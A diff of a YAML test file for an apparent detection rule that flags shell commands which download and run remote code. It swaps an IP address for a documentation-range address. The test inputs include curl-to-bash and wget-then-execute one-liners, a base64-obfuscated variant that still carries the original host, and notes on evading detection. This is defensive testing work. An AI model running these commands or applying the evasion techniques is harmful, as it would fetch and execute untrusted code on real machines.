@@ -92,7 +92,7 @@ test_cases:
   true_positives:
     - input: 'echo "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC9xMGM3ZXcycm84bDJjZnFwKSI=" | base64 -D | bash'
       expected: triggered
-    - input: 'curl -fsSL http://91.92.242.30/q0c7ew2ro8l2cfqp | bash'
+    - input: 'curl -fsSL http://203.0.113.30/q0c7ew2ro8l2cfqp | bash'
       expected: triggered
     - input: 'echo "malicious_base64_payload_here_with_50plus_chars_ABCDEF123456" | base64 -D | sh'
       expected: triggered
@@ -121,7 +121,7 @@ evasion_tests:
     expected: not_triggered
     bypass_technique: 'encoding_substitution'
     notes: 'Attacker could use base32, hex, or other encoding methods'
-  - input: 'wget 91.92.242.30/payload && chmod +x payload && ./payload'
+  - input: 'wget 203.0.113.30/payload && chmod +x payload && ./payload'
     expected: not_triggered
     bypass_technique: 'command_separation'
     notes: 'Split download and execution into separate commands'
